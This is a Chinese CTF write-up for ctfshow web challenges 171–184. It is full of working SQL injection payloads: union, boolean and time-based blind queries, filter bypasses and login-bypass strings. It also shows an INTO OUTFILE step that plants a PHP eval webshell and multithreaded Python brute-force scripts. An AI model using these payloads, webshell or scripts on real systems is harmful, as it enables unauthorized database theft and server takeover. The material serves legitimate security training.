---
title: ctfshow SQL注入
date: 2025-09-06 17:29:07
tags:
- CTF
- Web
- SQL注入
- 时间盲注
- 布尔盲注
- 报错注入
- 堆叠注入
- sqlmap
- Webshell
- MySQL
categories:
- ctfshow-web入门wp
description: " "
---



# web171

**==题解一==**

**题目查询语句如下**

```sql
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

**当我们输入 `id=1` 的时候，语句代入数据库中查询**

```sql
select username,password from user where username !='flag' and id ='1' limit 1;
```

**如果我们加个单引号**	

```sql
select username,password from user where username !='flag' and id ='1'' limit 1;
```

**出现语句不规范，报错**

**如果在后面加个注释符，即变成`id=1'--+`，注释符 `--+` 会把后面的语句全注释掉，就不会报错，语句就变成了**

```sql
select username,password from user where username !='flag' and id ='1'
```

&nbsp;



**使用 `order by` 查询列数，当到 `order by 3` 没有报错，即为3列**

```sql
1' order by 3--+
```

**将 `id` 改成 `-1` 把查询 `id` 回显的数据置空，查询库名 `ctfshow_web`**

```sql
-1' union select 1,2,database()--+
```

<img src="\images\article_images\image-20250823104847789.png" alt="image-20250823104847789" style="zoom:25%;" />

&nbsp;



**`group_concat()` 会把多行的结果拼接成一行，中间用逗号分隔。**

**查询表名**

```sql
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

<img src="\images\article_images\image-20250823105128348.png" alt="image-20250823105128348" style="zoom:25%;" />

&nbsp;



**查询列名**

```sql
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user'--+
```

<img src="\images\article_images\image-20250823105820909.png" alt="image-20250823105820909" style="zoom:25%;" />

&nbsp;



**查询字段记录**

```sql
1' union select 1,2,password from ctfshow_user--+

-1' union select group_concat(id),group_concat(username),group_concat(password) from ctfshow_user--+
```

<img src="\images\article_images\image-20250823110049881.png" alt="image-20250823110049881" style="zoom:25%;" />

&nbsp;





**==题解二==**

**万能密码**

```sql
1' or 1=1--+
1' or 1=1%23
```

<img src="\images\article_images\image-20250425132646554.png" alt="image-20250425132646554" style="zoom: 25%;" />



&nbsp;



---

# web172

**题目查询语句及返回逻辑如下**

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";

//检查结果是否有flag
    if($row->username!=='flag'){
      $ret['msg']='查询成功';
    }
```

**可知，flag位于 `ctfshow_user2` 表中**

&nbsp;



**==题解一==**

**查询列数为2**

```sql
1' order by 2--+
```

<img src="\images\article_images\image-20250823110527357.png" alt="image-20250823110527357" style="zoom:25%;" />

&nbsp;



**查询库名 `ctfshow_web`**

```sql
-1' union select 1,database()--+
```

<img src="\images\article_images\image-20250823110625365.png" alt="image-20250823110625365" style="zoom:25%;" />

&nbsp;



**查询表名，有两个表**

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

<img src="\images\article_images\image-20250823111050401.png" alt="image-20250823111050401" style="zoom:25%;" />

&nbsp;



**查询列名**

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user2" --+
```

<img src="\images\article_images\image-20250823111231458.png" alt="image-20250823111231458" style="zoom:25%;" />

&nbsp;



**查询字段记录**

```sql
-1' union select 1,password from ctfshow_user2--+
```

<img src="\images\article_images\image-20250823111325732.png" alt="image-20250823111325732" style="zoom:25%;" />

&nbsp;



**==题解二==**

**由题目查询语句及返回逻辑可以构造如下**

```sql
-1' union select username,password from ctfshow_user2--+
```

**但当 `username` 里有“flag”时无法输出，所以可以将字段记录转成Hex、ASCII、base64等编码输出**

&nbsp;



```sql
-1' union select to_base64(username),password from ctfshow_user2--+
-1' union select hex(username),password from ctfshow_user2--+
-1' union select ASCII(username),password from ctfshow_user2--+
```

<img src="\images\article_images\image-20250823112205922.png" alt="image-20250823112205922" style="zoom:25%;" />

&nbsp;



**==题解三==**

**只查出 `username` 为 `flag` 的那一行**

```sql
-1' union select 1,password from ctfshow_user2 where username='flag'--+
```

<img src="\images\article_images\image-20250823112820711.png" alt="image-20250823112820711" style="zoom:25%;" />

&nbsp;



---

# web173

```sql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";

      
返回逻辑
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

&nbsp;



**==题解一==**

**查询列数为2**

```sql
1' order by 3--+
```

<img src="\images\article_images\image-20250823125803070.png" alt="image-20250823125803070" style="zoom:25%;" />

&nbsp;



**查询库名 `ctfshow_web`**

```sql
-1' union select 1,2,database()--+
```

<img src="\images\article_images\image-20250823130255385.png" alt="image-20250823130255385" style="zoom:25%;" />

&nbsp;



**查询表名，有三个表**

```sql
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

<img src="\images\article_images\image-20250823130231610.png" alt="image-20250823130231610" style="zoom:25%;" />

&nbsp;



**查询列名**

```sql
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user3" --+
```

<img src="\images\article_images\image-20250823130337037.png" alt="image-20250823130337037" style="zoom:25%;" />

&nbsp;



**查询字段记录**

```sql
-1' union select 1,2,password from ctfshow_user3--+
```

<img src="\images\article_images\image-20250823130421126.png" alt="image-20250823130421126" style="zoom:25%;" />

&nbsp;





**==题解二==**

**由题目查询语句及返回逻辑可以构造如下**

```sql
-1' union select 1,username,password from ctfshow_user3--+
```

**但当 `username` 里有“flag”时无法输出，所以可以将字段记录转成Hex、ASCII、base64等编码输出**



```sql
-1' union select 1,to_base64(username),password from ctfshow_user3--+
-1' union select 1,hex(username),password from ctfshow_user3--+
-1' union select 1,ASCII(username),password from ctfshow_user3--+
```

<img src="\images\article_images\image-20250823131137945.png" alt="image-20250823131137945" style="zoom:25%;" />

&nbsp;



**==题解三==**

**只查出 `username` 为 `flag` 的那一行**

```sql
-1' union select 1,2,password from ctfshow_user3 where username='flag'--+
```

<img src="\images\article_images\image-20250823130811066.png" alt="image-20250823130811066" style="zoom:25%;" />



&nbsp;



---

# web174

```sql
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
     
     
返回逻辑
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

&nbsp;



**==题解一==**

**由于数字被过滤，可以将回显的结果用大写字母替换，替换规则如下**

```sql
replace(group_concat(table_name),
        '1','A'),
        '2','B'),
        '3','C'),
        '4','D'),
        '5','E'),
        '6','F'),
        '7','G'),
        '8','H'),
        '9','I'),
        '0','J')
```

&nbsp;





**查询列数为2**

```sql
1' order by 2--+
```

<img src="\images\article_images\image-20250823170725372.png" alt="image-20250823170725372" style="zoom:25%;" />

&nbsp;



**查询库名 `ctfshow_web`**

```sql
-1' union select 'a',database()--+
```

<img src="\images\article_images\image-20250823170709800.png" alt="image-20250823170709800" style="zoom:25%;" />



&nbsp;



**查询表名，只有一个表**

```sql
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from information_schema.tables where table_schema='ctfshow_web'--+
```

<img src="\images\article_images\image-20250823170643934.png" alt="image-20250823170643934" style="zoom:25%;" />

&nbsp;



**查询列名**

```sql
-1' union select 'a',group_concat(column_name) from information_schema.columns where table_name="ctfshow_user4" --+
```

<img src="\images\article_images\image-20250823170943945.png" alt="image-20250823170943945" style="zoom:25%;" />

&nbsp;



**查询字段记录**

```sql
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from ctfshow_user4--+
```

<img src="\images\article_images\image-20250823170601866.png" alt="image-20250823170601866" style="zoom:25%;" />

&nbsp;



**将回显的flag用脚本处理，恢复正确内容**

<img src="\images\article_images\image-20250823171310535.png" alt="image-20250823171310535" style="zoom:25%;" />

```python
def rev_replace(txt):
    repl = {
        'A': '1',
        'B': '2',
        'C': '3',
        'D': '4',
        'E': '5',
        'F': '6',
        'G': '7',
        'H': '8',
        'I': '9',
        'J': '0'
    }
 
    for k, v in repl.items():
        txt = txt.replace(k, v)
 
    return txt
 
txt = input("输入：")
out = rev_replace(txt)
print("替换后: ", out)
```

&nbsp;





**==题解二==**

**只查出 `username` 为 `flag` 的那一行**

```sql
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','A'),'2','B'),'3','C'),'4','D'),'5','E'),'6','F'),'7','G'),'8','H'),'9','I'),'0','J') from ctfshow_user4 where username='flag'--+
```

<img src="\images\article_images\image-20250823172630606.png" alt="image-20250823172630606" style="zoom:25%;" />



&nbsp;







**==题解三==**

**将查询结果写入靶机服务器**

```sql
1' union select username,password from ctfshow_user4 into outfile '/var/www/html/flag.txt'--+
```

**访问 `靶机/flag.txt`**

```php
/flag.txt
```

<img src="\images\article_images\image-20250823181144483.png" alt="image-20250823181144483" style="zoom:25%;" />

&nbsp;



**==题解四==**

**写入木马**

```sql
-1' union select 'a',<?php @eval($_POST[a]);?> into outfile "/var/www/html/1.php"--+
```



**可以访问 `/1.php` 说明写入成功**

<img src="\images\article_images\image-20250823205557176.png" alt="image-20250823205557176" style="zoom:33%;" />

&nbsp;



**连接蚁剑**

<img src="\images\article_images\image-20250823205031913.png" alt="image-20250823205031913" style="zoom:25%;" />

&nbsp;



**在 `/var/www/html/api/v4.php` 删掉 waf 语句**

<img src="\images\article_images\image-20250823204905296.png" alt="image-20250823204905296" style="zoom: 25%;" />

&nbsp;



**回到查询页面，可正常无过滤注入**

```sql
1' union select 1,password from ctfshow_user4--+
```

<img src="\images\article_images\image-20250823204825960.png" alt="image-20250823204825960" style="zoom:25%;" />

&nbsp;





**==题解五==**

**查询注入接口为 `/api/v4.php` ，并非靶机查询页面网址**

<img src="\images\article_images\image-20250823233438947.png" alt="image-20250823233438947" style="zoom:25%;" />

&nbsp;



**极速脚本解题**

<img src="\images\article_images\image-20250823233046012.png" alt="image-20250823233046012" style="zoom:25%;" />

```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===================== 配置区 =====================
URL = "http://62350fa3-1f63-4684-9981-7787a1bc0d90.challenge.ctf.show/api/v4.php"  # 目标地址
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"  # 爆破字典
TARGET_USER = "flag"   # 目标用户名
MAX_LEN = 50           # 爆破长度上限
THREADS = 10           # 并发线程数
DEBUG = False          # 是否打印调试信息（True/False）

# ★ i注入点、payload 模板写在配置区
PAYLOAD_TEMPLATE = "?id=1' and substr((select password from ctfshow_user4 where username=\"{user}\"),{pos},1)='{char}'--+"
SUCCESS_KEYWORD = "admin"  # ★ 判断正确的关键字
# =================== 配置区结束 ===================


def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(user=TARGET_USER, pos=pos, char=ch)
    url_full = URL + payload
    try:
        res = session.get(url=url_full, timeout=5)
    except requests.exceptions.RequestException:
        return None

    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}'")

    if SUCCESS_KEYWORD in res.text:
        return ch
    return None


def extract_flag():
    flag = ""
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None

        # ★ 多线程跑这一位的所有候选字符
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}

            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    break

        if found:
            flag += found
            print(f"[+] 当前Flag: {flag}")
        else:
            print("[*] 爆破结束")
            break

    return flag


if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终Flag: {result}")
```

&nbsp;



---

# web175

```sql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user5 where username !='flag' and id = '".$_GET['id']."' limit 1;";
    
    
返回逻辑
//检查结果是否有flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

**正则匹配过滤所有 ASCII 字符（从 `\x00` 到 `\x7f`，即 `0` 到 `127` 的所有字符，包括控制字符、数字、字母和符号）**

&nbsp;



**==题解一==**

**将查询结果写入靶机服务器**

```sql
1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.php'--+
```

&nbsp;



**访问 `靶机/1.php`**

```php
/1.php
```

<img src="\images\article_images\image-20250823224351059.png" alt="image-20250823224351059" style="zoom:25%;" />

&nbsp;





**==题解二==**

**发现页面存在延时**

```sql
1' and sleep(3)--+
```

**可以使用时间盲注脚本**

&nbsp;



```python
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# ===================== 配置区 =====================
URL = "http://4bbc4f29-3d36-42b9-abc0-c10dd3b3d326.challenge.ctf.show/api/v5.php"
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
TARGET_USER = "flag"
MAX_LEN = 50
THREADS = 10
DEBUG = False
TIME_THRESHOLD = 1  # 响应时间超过多少秒判定为正确字符
SLEEP_TIME = 1.5      # payload中sleep的秒数

# ★ payload模板改成时间盲注
PAYLOAD_TEMPLATE = "?id=1' and if(substr((select password from ctfshow_user5 where username='{user}'),{pos},1)='{char}', SLEEP({sleep}), 0)--+"
# =================== 配置区结束 ===================

def test_char(session, pos, ch):
    """测试某一位的某个字符"""
    payload = PAYLOAD_TEMPLATE.format(user=TARGET_USER, pos=pos, char=ch, sleep=SLEEP_TIME)
    url_full = URL + payload
    start = time.time()
    try:
        session.get(url=url_full, timeout=SLEEP_TIME + 2)
    except requests.exceptions.RequestException:
        return None
    elapsed = time.time() - start

    if DEBUG:
        print(f"[DEBUG] pos={pos}, try='{ch}', time={elapsed:.2f}s")

    if elapsed >= TIME_THRESHOLD:
        return ch
    return None

def extract_flag():
    flag = ""
    session = requests.Session()

    for i in range(1, MAX_LEN + 1):
        found = None
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = {executor.submit(test_char, session, i, ch): ch for ch in CHARSET}
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    found = result
                    break

        if found:
            flag += found
            print(f"[+] 当前Flag: {flag}")
        else:
            print("[*] 爆破结束")
            break

    return flag

if __name__ == "__main__":
    result = extract_flag()
    print(f"\n最终Flag: {result}")

```

&nbsp;



**==题解三==**

**利用BurpSuite爆破**

&nbsp;



**爆破数据库长度：11**

**payload插入点： `1' and if(length(database())=§1§,sleep(3),0)--+`**

```sql
1' and if(length(database())=1,sleep(3),0)--+
```

**`1%27%20and%20if(length(database())=§1§,sleep(3),0)--+`**

<img src="\images\article_images\image-20250824152148641.png" alt="image-20250824152148641" style="zoom: 25%;" />

&nbsp;



<img src="\images\article_images\image-20250824152251075.png" alt="image-20250824152251075" style="zoom: 25%;" />

&nbsp;





**爆破数据库名：`ctfshow_web`**

**payload插入点：`1' and if(substr(database(),§1§,1)='§a§',sleep(5),1)--+`**

```sql
1' and if(substr(database(),1,1)='a',sleep(5),1)--+
```

**`1%27%20and%20if(substr(database(),§1§,1)=%27§a§%27,sleep(5),1)--+`**

<img src="\images\article_images\image-20250824153401961.png" alt="image-20250824153401961" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250824153335073.png" alt="image-20250824153335073" style="zoom: 25%;" />

&nbsp;





**爆破表数量：1**

 **payload插入点：`1' and if((select count(table_name) from information_schema.tables where table_schema='ctfshow_web')=§1§,sleep(5),1)--+`**

```sql
1' and if((select count(table_name) from information_schema.tables where table_schema='ctfshow_web')=1,sleep(5),1)--+
```

**`1%27%20and%20if((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=%27ctfshow_web%27)=§1§,sleep(5),1)--+`**

<img src="\images\article_images\image-20250824153801484.png" alt="image-20250824153801484" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250824153738062.png" alt="image-20250824153738062" style="zoom:25%;" />

&nbsp;





**爆破表名长度：13**

**payload插入点：`1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=§1§,sleep(5),1)--+`**

```sql
1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1,sleep(5),1)--+
```

**`1%27%20and%20if(length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))=§1§,sleep(5),1)--+`**

<img src="\images\article_images\image-20250824161451417.png" alt="image-20250824161451417" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250824161413215.png" alt="image-20250824161413215" style="zoom:25%;" />



&nbsp;



**爆破表名：`ctfshow_user5`**

**payload插入点：`1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§0§,1)='§a§',sleep(5),1)--+`**

```sql
1' and if((substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)='a',sleep(5),1)--+
```

**`1%27%20and%20if((substr(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),0,1)=%27a%27,sleep(5),1)--+`**

<img src="\images\article_images\image-20250824162241422.png" alt="image-20250824162241422" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250824162207412.png" alt="image-20250824162207412" style="zoom:25%;" />

&nbsp;





**爆破flag**

**payload插入点：`1' and if(substr((select password from ctfshow_user5 where username='flag'),§0§,1)='§a§',sleep(5),1)--+`**

```sql
1' and if(substr((select password from ctfshow_user5 where username='flag'),0,1)='§a§',sleep(5),1)--+
```

**`1%27%20and%20if(substr((select%20password%20from%20ctfshow_user5%20where%20username=%27flag%27),0,1)=%27a%27,sleep(5),1)--+`**

<img src="\images\article_images\image-20250824163750090.png" alt="image-20250824163750090" style="zoom:25%;" />



&nbsp;



<img src="\images\article_images\image-20250824163731570.png" alt="image-20250824163731570" style="zoom:25%;" />

&nbsp;



---

# web176

```sql
查询语句
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
    
    
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

**过滤了 `select`**

&nbsp;



**==题解一==**

**查询列数为3**

```sql
1' order by 3--+
```

<img src="\images\article_images\image-20250824170031112.png" alt="image-20250824170031112" style="zoom:25%;" />

&nbsp;



**`select` 被过滤，使用大小写混合绕过**

**查询库名 `ctfshow_web`**

```sql
-1' union Select 1,2,database()--+
```

<img src="\images\article_images\image-20250824170106246.png" alt="image-20250824170106246" style="zoom:25%;" />

&nbsp;



**查询表名，有一个表**

```sql
-1' union Select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

<img src="\images\article_images\image-20250824170233810.png" alt="image-20250824170233810" style="zoom:80%;" />

&nbsp;





**查询列**

```sql
-1' union Select 1,2,group_concat(column_name) from information_schema.columns where table_name="ctfshow_user" --+
```

<img src="\images\article_images\image-20250824170316143.png" alt="image-20250824170316143" style="zoom:25%;" />

&nbsp;



**查询字段记录**

```sql
-1' union Select 1,2,password from ctfshow_user--+
```

<img src="\images\article_images\image-20250824170349763.png" alt="image-20250824170349763" style="zoom:80%;" />



&nbsp;



**==题解二==**

**只查出 `username` 为 `flag` 的那一行**

```sql
-1' union Select 1,2,password from ctfshow_user where username = 'flag'--+
```

<img src="\images\article_images\image-20250824170557781.png" alt="image-20250824170557781" style="zoom:25%;" />

&nbsp;



**==题解三==**

**使用万能密码**

```sql
1' or 1=1--+
```

<img src="\images\article_images\image-20250824170645135.png" alt="image-20250824170645135" style="zoom: 25%;" />

&nbsp;





---

# web177

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

**过滤了 `空格`、`--+`**

&nbsp;



**可以使用以下字符绕过空格过滤**

- **`%0a`     换行符**
- **`/**/ `   注释符**
- **`%09`     水平制表符 (TAB)**
- **`%0b`     垂直制表符**
- **`%0c`     换页符**
- **`%0d`     回车符** 

**注意不能用 `%20`，因为空格也会被解析成 `%20`，因此并没有绕过**

&nbsp;



**==题解一==**

```sql
-1'%0aunion%0aselect%0a1,2,password%0afrom%0actfshow_user%0awhere%0ausername='flag'%23
```

<img src="\images\article_images\image-20250824213947908.png" alt="image-20250824213947908" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用万能密码**

```sql
1'%0aor%0a1=1%23
```

&nbsp;



---

# web178

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

**过滤了 `空格`、`--+`、`/**/`**

&nbsp;



**==题解一==**

```sql
-1'%0aunion%0aselect%0a1,2,password%0afrom%0actfshow_user%0awhere%0ausername='flag'%23
```

<img src="\images\article_images\image-20250824214327111.png" alt="image-20250824214327111" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用万能密码**

```sql
1'%0aor%0a1=1%23
```

&nbsp;



---

# web179

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

**过滤了 `空格`、`--+`、`/**/`、`%09`、`%0a`、`%0b`、`%0d`**

&nbsp;



**==题解一==**

```sql
-1'%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%23
```

<img src="\images\article_images\image-20250824214734756.png" alt="image-20250824214734756" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用万能密码**

```sql
1'%0cor%0c1=1%23
```

<img src="\images\article_images\image-20250426091514097.png" alt="image-20250426091514097" style="zoom: 25%;" />

&nbsp;



---

# web180

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
```

**过滤了 `空格`、`--+`、`/**/`、`%09`、`%0a`、`%0b`、`%0d`、`%23`**

&nbsp;



**==题解一==**

**`where '1'='1'`**

- **恒为真条件**
- **等价于：直接查询整张表的 `password`**

```sql
-1'%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c'1'='1
```

<img src="\images\article_images\image-20250824215714133.png" alt="image-20250824215714133" style="zoom:25%;" />

&nbsp;



**==题解二==**

**flag位于id=26**

```sql
'or(id=26)and'1
'or(id=26)and'1'='1
0'or(id=26)and'1'='1
-1'or(id=26)and'1'='1

#传入数据库为(id = '') OR (id = 26 AND '1'='1')    and的优先级大于or
#最终false OR (true AND true) → true
```

&nbsp;



<img src="\images\article_images\image-20250426093043695.png" alt="image-20250426093043695" style="zoom:25%;" />

<img src="\images\article_images\image-20250426093158501.png" alt="image-20250426093158501" style="zoom: 25%;" />

&nbsp;



---

# web181

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

&nbsp;



**==题解一==**

**`OR (username)='flag'` → 如果表里有一条记录满足 `username='flag'`，则条件为真**

```sql
-1'or(username)='flag
-1'or(id)='26
-1'||username='flag
-1'||id='26
```

<img src="\images\article_images\image-20250824220401797.png" alt="image-20250824220401797" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用万能密码**

```sql
'or(id=26)and'1'='1
'or(id=26)and'1
0'or(id=26)and'1
-1'or(id=26)and'1
```

<img src="\images\article_images\image-20250426095518027.png" alt="image-20250426095518027" style="zoom:25%;" />



<img src="\images\article_images\image-20250426094555175.png" alt="image-20250426094555175" style="zoom:25%;" />

&nbsp;



---

# web182

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
  
  
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str);
  }
```

&nbsp;



**==题解一==**

```sql
-1'or((username)=concat("fl","ag"))and'1'='1
-1'||username=(concat("fl","ag"))and'1
-1'or(id)='26
-1'||id='26
```

<img src="\images\article_images\image-20250824221444937.png" alt="image-20250824221444937" style="zoom:25%;" />

&nbsp;



**==题解二==**

**使用万能密码**

```sql
'or(id=26)and'1'='1
'or(id=26)and'1
0'or(id=26)and'1
-1'or(id=26)and'1
```

&nbsp;



---

# web183

```sql
查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(pass) from ".$_POST['tableName'].";";
   
   
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str);
  }

   
查询结果
//返回用户表的记录总数
      $user_count = 0;
```

&nbsp;



 **`%` 代表通配符（任意字符串）**

**`%` URL编码为 `%25`**

**可以通过回显值判断flag是否正确**

```sql
tableName=(ctfshow_user)where(pass)like'ctfshow%25'
```

<img src="\images\article_images\image-20250824222922226.png" alt="image-20250824222922226" style="zoom:25%;" />

&nbsp;



**脚本post**

<img src="\images\article_images\image-20250824224700335.png" alt="image-20250824224700335" style="zoom:25%;" />

```python
import requests
import time

# ==================== 配置区 ====================
# 目标 URL
URL = "http://62068be2-b35f-44b9-a953-dcf9022c5953.challenge.ctf.show/select-waf.php"

# POST 请求参数配置
POST_NAME = "tableName"                # POST 的 name
POST_VALUE_PREFIX = "(ctfshow_user)where(pass)like'"  # value 的前缀
POST_VALUE_SUFFIX = "%'"                # value 的后缀

# 可选字符集，根据实际 flag 特点可以缩小范围提高效率
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz{}-"

# 已知 flag 前缀
PREFIX = "ctfshow{"

# 最大尝试长度（避免死循环）
MAX_LEN = 45

# 每次请求之间的延迟，避免被 WAF 封禁
SLEEP_TIME = 0.05

# 服务器响应里判断条件是否成立的关键字
SUCCESS_KEY = "$user_count = 1"

# ==================== 脚本逻辑 ====================

def brute_force():
    flag = PREFIX
    for i in range(len(PREFIX), MAX_LEN):
        found = False
        for ch in CHARSET:
            payload = f"{POST_VALUE_PREFIX}{flag + ch}{POST_VALUE_SUFFIX}"
            data = {POST_NAME: payload}
            
            try:
                res = requests.post(url=URL, data=data, timeout=5)
            except requests.exceptions.RequestException as e:
                print(f"[!] 请求出错: {e}")
                continue
            
            if SUCCESS_KEY in res.text:
                flag += ch
                print(f"[+] 已发现: {flag}")
                found = True
                if ch == "}":   # flag 结束标志
                    print(f"[✓] 最终 flag: {flag}")
                    return flag
                break
        
        if not found:
            print("[!] 没找到下一个字符，可能 flag 完成或 CHARSET 不全")
            break
        
        time.sleep(SLEEP_TIME)

if __name__ == "__main__":
    brute_force()

```

&nbsp;



---

# web184

```sql
查询语句
//拼接sql语句查找指定ID用户
  $sql = "select count(*) from ".$_POST['tableName'].";";
   
   
返回逻辑
//对传入的参数进行了过滤
  function waf($str){
    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
  }

   
查询结果
//返回用户表的记录总数
      $user_count = 0;
```

&nbsp;



**`RIGHT JOIN` 右连接**

**1.基本概念**

`RIGHT JOIN`（也叫 **右连接**）是 SQL 中的 **表连接**方式之一，它用于从 **两个表中获取数据**：

- **右表**（`RIGHT JOIN` 后面的表）中的所有记录都会被保留。
- **左表**（`RIGHT JOIN` 前面的表）中如果没有匹配的记录，则对应的字段会返回 `NULL`。
- 换句话说，它是 `LEFT JOIN` 的“镜像”：保留的是右表的全部行。

**2.语法**

```sql
SELECT 列名
FROM 表1
RIGHT JOIN 表2
ON 表1.字段 = 表2.字段;
```

- `表1`：左表
- `表2`：右表
- `ON 表1.字段 = 表2.字段`：连接条件
- `SELECT 列名`：可以选择左表、右表或两表的字段

**注意**：如果右表中的某行在左表中没有匹配，则左表字段返回 `NULL`。

**3.示例**

假设有两个表：

**表 `students`：**

| id   | name  |
| ---- | ----- |
| 1    | Alice |
| 2    | Bob   |
| 3    | Carol |

**表 `scores`：**

| student_id | score |
| ---------- | ----- |
| 1          | 90    |
| 2          | 85    |
| 4          | 88    |

我们用 `RIGHT JOIN`：

```sql
SELECT students.id, students.name, scores.score
FROM students
RIGHT JOIN scores
ON students.id = scores.student_id;
```

**结果：**

| id   | name  | score |
| ---- | ----- | ----- |
| 1    | Alice | 90    |
| 2    | Bob   | 85    |
| NULL | NULL  | 88    |

解释：

- `student_id = 1` → 匹配，返回 Alice 的信息
- `student_id = 2` → 匹配，返回 Bob 的信息
- `student_id = 4` → 不匹配左表，返回 `NULL`



&nbsp;



```sql
ctfshow%    16进制编码后-->   0x63746673686f7725
```

**MySQL 会自动把 `0x63746673686f7725` 当作字符串处理，可以绕过单引号过滤**

&nbsp;



**`ctfshow_user AS a`：把表 `ctfshow_user` 起别名 `a`。**

**`RIGHT JOIN ctfshow_user AS b`：右连接同一个表，起别名 `b`，用于自己跟自己做条件匹配。**

